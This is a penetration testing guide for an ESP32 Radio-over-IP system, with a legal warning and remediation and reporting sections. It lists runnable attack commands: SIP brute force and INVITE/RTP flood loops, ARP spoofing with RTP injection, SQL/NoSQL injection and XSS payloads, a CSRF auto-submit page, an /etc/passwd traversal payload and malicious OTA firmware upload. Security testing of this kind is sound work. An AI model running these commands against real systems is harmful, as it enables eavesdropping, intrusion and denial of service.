# ESP32 RoIP Penetration Testing Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Testing Environment Setup](#testing-environment-setup)
3. [Attack Vectors](#attack-vectors)
4. [Testing Procedures](#testing-procedures)
5. [Tools](#tools)
6. [Remediation](#remediation)
7. [Reporting](#reporting)

---

## Introduction

This guide provides comprehensive penetration testing procedures specifically for the ESP32 RoIP (Radio over IP) system. VoIP/RoIP systems have unique attack surfaces that require specialized testing approaches.

### Scope of Testing

- SIP Protocol Security
- RTP Media Stream Security
- Web API Security
- WebSocket Security
- Database Security
- Network Infrastructure
- ESP32 Firmware Security

### Testing Philosophy

- **White Box Testing:** Full access to source code and configuration
- **Gray Box Testing:** Partial knowledge of system architecture
- **Black Box Testing:** External attacker perspective

### Legal & Ethical Considerations

**IMPORTANT:** Only perform penetration testing on systems you own or have explicit written permission to test. Unauthorized testing is illegal.

---

## Testing Environment Setup

### Lab Environment

Create an isolated testing environment:

```bash
# Network topology
┌─────────────────────┐
│   Testing Laptop    │
│   (Kali Linux)      │
└──────┬──────────────┘
       │
       │ 192.168.100.0/24
       │
       ├──────────┬──────────┬──────────┐
       │          │          │          │
   ┌───┴───┐  ┌──┴───┐  ┌───┴───┐  ┌──┴───┐
   │ RoIP  │  │ ESP32│  │ ESP32 │  │ SIP  │
   │Server │  │  #1  │  │  #2   │  │Phone │
   └───────┘  └──────┘  └───────┘  └──────┘
```

### Required Tools Installation

```bash
# Install Kali Linux or use Docker
docker pull kalilinux/kali-rolling

# Essential VoIP testing tools
apt-get update
apt-get install -y \
    sipvicious \
    sipp \
    sippts \
    nmap \
    wireshark \
    tcpdump \
    metasploit-framework \
    sqlmap \
    burpsuite \
    owasp-zap \
    nikto \
    dirb

# Install Node.js security tools
npm install -g \
    snyk \
    retire \
    npm-audit-resolver

# VoIP-specific tools
git clone https://github.com/EnableSecurity/sipvicious.git
git clone https://github.com/kapetan/dns.git
git clone https://github.com/rtckit/sipexer.git
```

---

## Attack Vectors

### 1. SIP Protocol Attacks

#### A. SIP Registration Hijacking
**Description:** Attacker registers with victim's credentials
**Impact:** Call interception, unauthorized calls
**CVSS Score:** 8.1 (High)

#### B. SIP Enumeration
**Description:** Discover valid SIP extensions/users
**Impact:** Information disclosure, targeted attacks
**CVSS Score:** 5.3 (Medium)

#### C. Authentication Bypass
**Description:** Weak/missing authentication
**Impact:** Complete system compromise
**CVSS Score:** 9.8 (Critical)

### 2. RTP Stream Attacks

#### A. RTP Injection
**Description:** Inject malicious audio into active calls
**Impact:** Audio manipulation, denial of service
**CVSS Score:** 6.5 (Medium)

#### B. RTP Eavesdropping
**Description:** Capture unencrypted RTP streams
**Impact:** Confidentiality breach
**CVSS Score:** 7.5 (High)

### 3. Web Application Attacks

#### A. SQL Injection
**Description:** Inject malicious SQL queries
**Impact:** Data breach, authentication bypass
**CVSS Score:** 9.8 (Critical)

#### B. Cross-Site Scripting (XSS)
**Description:** Inject malicious JavaScript
**Impact:** Session hijacking, data theft
**CVSS Score:** 6.1 (Medium)

#### C. Cross-Site Request Forgery (CSRF)
**Description:** Force authenticated actions
**Impact:** Unauthorized operations
**CVSS Score:** 6.5 (Medium)

### 4. Denial of Service Attacks

#### A. SIP Flood
**Description:** Overwhelm server with SIP messages
**Impact:** Service unavailable
**CVSS Score:** 7.5 (High)

#### B. RTP Flood
**Description:** Flood RTP ports with packets
**Impact:** Call quality degradation
**CVSS Score:** 5.3 (Medium)

---

## Testing Procedures

### Phase 1: Information Gathering (Reconnaissance)

#### 1.1 Network Scanning

```bash
# Basic port scan
nmap -sV -p- <target-ip>

# UDP scan for SIP/RTP
nmap -sU -p 5060,10000-10100 <target-ip>

# Service version detection
nmap -sV -p 5060,8080 -A <target-ip>

# OS fingerprinting
nmap -O <target-ip>

# Save results
nmap -sV -p- -oA roip_scan <target-ip>
```

**Expected Results:**
- Port 5060/UDP: SIP service
- Port 8080/TCP: HTTP API
- Port 3000/TCP: WebSocket (if enabled)
- Ports 10000-10100/UDP: RTP media

#### 1.2 SIP Server Enumeration

```bash
# Enumerate SIP server
sipvicious svmap <target-ip>

# Identify SIP methods supported
sipvicious svmap <target-ip> --method OPTIONS

# Check for default extensions
sipvicious svwar -m INVITE <target-ip> -e 100-199

# Extension enumeration
sipvicious svwar -m REGISTER <target-ip> -e 1000-1999
```

#### 1.3 Web Application Reconnaissance

```bash
# Directory enumeration
dirb http://<target-ip>:8080 /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb http://<target-ip>:8080

# Subdomain enumeration (if applicable)
subfinder -d <domain>

# Certificate information
openssl s_client -connect <target-ip>:443 -showcerts
```

---

### Phase 2: SIP Authentication Testing

#### 2.1 SIP Authentication Bypass

```bash
# Test for missing authentication
sippts send -i <target-ip> -m INVITE -ua "TestUA" \
    -from sip:attacker@<target-ip> \
    -to sip:1000@<target-ip>

# Test with empty credentials
sippts send -i <target-ip> -m REGISTER \
    -from sip:test@<target-ip> \
    -user "" -pass ""

# Test with default credentials
for user in admin root support; do
    for pass in admin password 123456; do
        echo "Testing $user:$pass"
        sippts auth -i <target-ip> -u $user -p $pass
    done
done
```

#### 2.2 Digest Authentication Weakness

```bash
# Capture authentication challenge
sippts send -i <target-ip> -m REGISTER -v

# Test for MD5 collision attacks
# (Theoretical - requires custom tooling)

# Test nonce reuse
# Send multiple requests with same nonce
```

#### 2.3 Brute Force Attack

```bash
# SIP password brute force (use with caution)
sipvicious svcrack -u 1000 -d <wordlist> <target-ip>

# Example wordlist
cat > sip_passwords.txt <<EOF
password
123456
admin
roip123
esp32
default
ESP32
Password1
EOF

# Automated brute force
sippts auth -i <target-ip> -u 1000 -dict sip_passwords.txt
```

**Remediation Check:**
- [ ] Account lockout after 5 failed attempts
- [ ] Rate limiting implemented
- [ ] Strong password policy enforced
- [ ] Brute force attempts logged and alerted

---

### Phase 3: SIP Vulnerability Testing

#### 3.1 SIP Message Fuzzing

```bash
# Fuzz INVITE messages
sippts fuzz -i <target-ip> -m INVITE -field all

# Fuzz header injection
sippts send -i <target-ip> -m INVITE \
    -header "Malicious: \r\nInjected: header"

# Test for buffer overflow
sippts send -i <target-ip> -m INVITE \
    -from $(python -c 'print("sip:" + "A"*1000 + "@<target-ip>")')
```

#### 3.2 SIP Denial of Service

```bash
# INVITE flood
while true; do
    sippts send -i <target-ip> -m INVITE \
        -from sip:flood@attacker \
        -to sip:1000@<target-ip> &
done

# Registration flood
for i in {1..1000}; do
    sippts send -i <target-ip> -m REGISTER \
        -from sip:user$i@<target-ip> &
done

# Malformed message attack
echo "INVITE sip:1000@<target-ip> SIP/2.0
From: <sip:test@invalid
To: <sip:1000@<target-ip>
Call-ID: invalid
CSeq: 1 INVITE
" | nc -u <target-ip> 5060
```

**Expected Behavior:**
- Server should rate limit requests
- Malformed messages should be rejected
- Server should not crash

#### 3.3 Call Hijacking

```bash
# Capture SIP dialog
tcpdump -i eth0 -w sip_capture.pcap port 5060

# Replay captured messages
tcpreplay -i eth0 sip_capture.pcap

# Send malicious BYE to terminate call
sippts send -i <target-ip> -m BYE \
    -from <captured-from> \
    -to <captured-to> \
    -callid <captured-callid>
```

---

### Phase 4: RTP Media Stream Testing

#### 4.1 RTP Stream Interception

```bash
# Capture RTP traffic
tcpdump -i eth0 -w rtp_capture.pcap \
    'udp and portrange 10000-10100'

# Decode RTP streams with Wireshark
wireshark rtp_capture.pcap

# Extract audio
tshark -r rtp_capture.pcap -q -z rtp,streams
tshark -r rtp_capture.pcap -T fields -e rtp.payload > audio.raw
```

**Remediation:**
- [ ] SRTP encryption enabled
- [ ] ZRTP key exchange implemented

#### 4.2 RTP Injection Attack

```bash
# Inject audio into RTP stream
rtpinject -i eth0 -s <source-ip> -d <dest-ip> \
    -p <rtp-port> -f malicious_audio.wav

# Man-in-the-Middle RTP
arpspoof -i eth0 -t <victim-ip> <gateway-ip>
fragroute <victim-ip>
```

#### 4.3 RTP Flood

```bash
# Flood RTP ports
hping3 -2 -p 10000 --flood <target-ip>

# UDP flood on RTP range
for port in {10000..10100}; do
    hping3 -2 -p $port --flood <target-ip> &
done
```

---

### Phase 5: Web API Security Testing

#### 5.1 Authentication & Authorization

```bash
# Test JWT token validation
curl -X GET http://<target-ip>:8080/api/v1/users \
    -H "Authorization: Bearer invalid_token"

# Test token expiration
# Use expired token

# Test authorization bypass
curl -X POST http://<target-ip>:8080/api/v1/admin/users \
    -H "Authorization: Bearer <user-token>"

# Test JWT algorithm confusion
# Create token with "alg": "none"
```

#### 5.2 SQL Injection Testing

```bash
# Manual SQL injection tests
curl -X POST http://<target-ip>:8080/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR 1=1--","password":"any"}'

# Automated SQL injection scan
sqlmap -u "http://<target-ip>:8080/api/v1/users?id=1" \
    --cookie="token=<jwt-token>" \
    --batch --level=5 --risk=3

# Time-based blind SQL injection
curl -X GET "http://<target-ip>:8080/api/v1/users?id=1' AND SLEEP(5)--"

# Database enumeration
sqlmap -u "http://<target-ip>:8080/api/v1/users?id=1" \
    --cookie="token=<jwt-token>" \
    --dbs --batch
```

#### 5.3 Cross-Site Scripting (XSS)

```bash
# Reflected XSS
curl -X GET "http://<target-ip>:8080/search?q=<script>alert(1)</script>"

# Stored XSS
curl -X POST http://<target-ip>:8080/api/v1/devices \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer <token>" \
    -d '{"name":"<script>alert(document.cookie)</script>"}'

# DOM-based XSS
# Test client-side JavaScript handling of user input
```

#### 5.4 API Rate Limiting

```bash
# Test rate limiting
for i in {1..1000}; do
    curl -X POST http://<target-ip>:8080/api/v1/login \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"wrong"}' &
done

# Measure response
time curl -X GET http://<target-ip>:8080/api/v1/users
```

**Expected:**
- Rate limit: 100 requests/minute
- 429 Too Many Requests response
- Retry-After header

#### 5.5 CSRF Testing

```bash
# Create CSRF PoC
cat > csrf_test.html <<EOF
<html>
<body>
<form action="http://<target-ip>:8080/api/v1/users/delete" method="POST">
    <input type="hidden" name="id" value="1"/>
    <input type="submit" value="Click me"/>
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
EOF

# Test without CSRF token
curl -X POST http://<target-ip>:8080/api/v1/users/delete \
    -H "Cookie: session=<valid-session>" \
    -d "id=1"
```

---

### Phase 6: WebSocket Security

#### 6.1 WebSocket Hijacking

```javascript
// Test WebSocket connection
const WebSocket = require('ws');

const ws = new WebSocket('ws://<target-ip>:3000');

ws.on('open', function open() {
    console.log('Connected');
    // Try to send unauthorized commands
    ws.send(JSON.stringify({
        type: 'admin_command',
        action: 'get_all_users'
    }));
});

ws.on('message', function incoming(data) {
    console.log('Received:', data);
});
```

#### 6.2 WebSocket Message Injection

```bash
# Use websocat for testing
websocat ws://<target-ip>:3000

# Send malicious payloads
{"type":"call","data":"<script>alert(1)</script>"}
{"type":"call","data":{"action":"../../../etc/passwd"}}
```

---

### Phase 7: Database Security

#### 7.1 Direct Database Access

```bash
# Test for exposed database port
nmap -p 5432,3306 <target-ip>

# Attempt connection
psql -h <target-ip> -U roip_user -d roip_server

# Test for default credentials
psql -h <target-ip> -U postgres -d postgres
```

#### 7.2 NoSQL Injection (if applicable)

```bash
# MongoDB injection
curl -X POST http://<target-ip>:8080/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

---

### Phase 8: ESP32 Firmware Security

#### 8.1 Firmware Analysis

```bash
# Download firmware (if OTA endpoint exposed)
wget http://<target-ip>/firmware.bin

# Analyze firmware
binwalk -e firmware.bin
strings firmware.bin | grep -i "password\|secret\|key"

# Extract filesystem
binwalk --dd='.*' firmware.bin
```

#### 8.2 OTA Update Security

```bash
# Test OTA without authentication
curl -X POST http://<target-ip>/update \
    -F "firmware=@malicious_firmware.bin"

# Test for firmware validation
curl -X POST http://<target-ip>/update \
    -F "firmware=@unsigned_firmware.bin"

# MITM OTA update
# Intercept and modify firmware during update
```

#### 8.3 WiFi Security

```bash
# Test for WiFi credentials in firmware
strings firmware.bin | grep -i "wifi\|ssid\|psk"

# Test WPS vulnerability (if enabled)
reaver -i wlan0mon -b <esp32-mac> -vv
```

---

## Tools Reference

### SIPVicious Suite
```bash
# Map SIP servers
svmap <target-range>

# Enumerate extensions
svwar -m INVITE <target-ip>

# Password crack
svcrack -u <extension> -d <wordlist> <target-ip>

# SIP call flood
svcrash <target-ip>
```

### SIPp (SIP Performance)
```bash
# Basic call test
sipp -sn uac <target-ip>:5060

# Custom scenario
sipp -sf scenario.xml <target-ip>:5060 -i <local-ip> -p 5061

# Load test
sipp -sn uac <target-ip>:5060 -r 10 -rp 1000
```

### Metasploit VoIP Modules
```bash
msfconsole
use auxiliary/scanner/sip/enumerator
set RHOSTS <target-ip>
run

use auxiliary/voip/sip_invite_spoof
set RHOSTS <target-ip>
run
```

### Wireshark Filters
```
# SIP traffic
sip

# RTP traffic
rtp

# SIP + RTP
sip || rtp

# Failed SIP authentication
sip.Status-Code == 401 || sip.Status-Code == 407

# RTP packet loss
rtp.analysis.lost_packet
```

---

## Remediation Procedures

### Critical Issues

#### 1. Default Credentials Found
**Immediate Action:**
```bash
# Change all default passwords
# Update configuration
sed -i 's/change-me-in-production/<new-secret>/g' .env

# Rotate JWT secret
openssl rand -base64 32 > jwt_secret.txt

# Update database passwords
psql -c "ALTER USER roip_user WITH PASSWORD '<new-password>';"
```

#### 2. Unencrypted RTP Streams
**Immediate Action:**
```yaml
# Enable SRTP in config
audio:
  encryption:
    enabled: true
    algorithm: AES_CM_128_HMAC_SHA1_80
```

#### 3. SQL Injection Vulnerability
**Immediate Action:**
```javascript
// Use parameterized queries
const result = await db.query(
    'SELECT * FROM users WHERE username = $1',
    [username]  // Parameterized
);

// NOT this:
const result = await db.query(
    `SELECT * FROM users WHERE username = '${username}'`  // Vulnerable
);
```

### High Issues

#### 1. Missing Rate Limiting
```javascript
// Add rate limiting
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/api/', limiter);
```

#### 2. No Input Validation
```javascript
// Add validation with Joi
import Joi from 'joi';

const schema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().pattern(new RegExp('^[a-zA-Z0-9]{8,30}$')),
});

const { error, value } = schema.validate(req.body);
```

---

## Reporting Template

### Executive Summary

**Test Date:** [Date]
**Tester:** [Name]
**System:** ESP32 RoIP v1.0
**Overall Risk:** [Critical/High/Medium/Low]

### Findings Summary

| Severity | Count | Fixed |
|----------|-------|-------|
| Critical | X     | Y     |
| High     | X     | Y     |
| Medium   | X     | Y     |
| Low      | X     | Y     |

### Critical Findings

#### Finding 1: [Title]
**Severity:** Critical
**CVSS Score:** 9.8
**Description:** [Detailed description]
**Impact:** [Business impact]
**Steps to Reproduce:**
```bash
[Commands or steps]
```
**Evidence:** [Screenshots/logs]
**Remediation:**
```bash
[Fix commands/code]
```
**Retest Results:** [Pass/Fail]

---

## Continuous Security Testing

### Automated Scanning Schedule

```bash
# Daily quick scan
0 2 * * * /opt/roip/security/audit.sh --quick

# Weekly full scan
0 3 * * 0 /opt/roip/security/audit.sh --full --report

# Monthly penetration test
0 4 1 * * /opt/roip/security/pentest.sh --comprehensive
```

### Monitoring for Attacks

```bash
# Monitor failed authentication
tail -f /var/log/roip/security.log | grep "auth:failed"

# Monitor SIP flood
tcpdump -i eth0 port 5060 -c 1000 | \
    awk '{print $3}' | sort | uniq -c | sort -rn

# Alert on suspicious activity
fail2ban-client status roip-sip
```

---

## References

- [OWASP VoIP Security Testing Guide](https://owasp.org/www-project-voip-security/)
- [SIPVicious Documentation](http://www.sipvicious.org/)
- [RFC 3261 - SIP Protocol](https://tools.ietf.org/html/rfc3261)
- [RFC 3550 - RTP Protocol](https://tools.ietf.org/html/rfc3550)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Document Version:** 1.0
**Last Updated:** 2024-11-22
**Author:** Security Team
